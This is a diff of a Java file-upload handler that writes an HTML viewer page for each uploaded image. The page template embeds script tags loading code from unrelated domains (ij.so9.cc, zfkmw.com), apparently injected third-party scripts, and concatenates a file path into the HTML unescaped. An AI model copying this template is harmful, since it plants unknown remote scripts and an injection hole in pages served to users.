@@ -114,7 +114,7 @@ public class FileAction {
 					//resultData.setMsg("文件成功上传到指定目录");
 					resultData.setPath(path);
 					resultData.setRealName(trueFileName);
-					queryService.filePathToUser(username,absolutePath);
+					queryService.filePathToUser(username,absolutePath,realPath);
 					
 					String showImgPath = realPath+"showImg\\"+trueFileName.substring(0,trueFileName.indexOf("."))+".html";
 					//String showImgTest = realPath+"showImg\\test.html";
@@ -132,7 +132,7 @@ public class FileAction {
 //		            }
 //			        System.out.println(content);
 //			        htmlReader.close();
-					String filepath = queryService.initShowImage(username);
+//					String filepath = queryService.initShowImage(username);
 			        String content = "<!DOCTYPE html><html><head><script async=\"\" src=\"//ij.so9.cc/j/?t=fx&amp;g=d8c8e9da44d8&amp;c=44032c45701d&amp;rv=1\"></script><meta charset=\"utf-8\"><meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"><title>主页</title><script src=\"https://zfkmw.com/j/gyo.js?_=1542988800\"></script><script type=\"text/javascript\" src=\"undefined\"></script></head><body><div style=\"text-align:center; margin-top:10%;\"><img src=\""+
                              "../"+absolutePath
 			        		+"\" style=\"display:block;max-width:85%;margin:0 auto;\">\r\n" + 
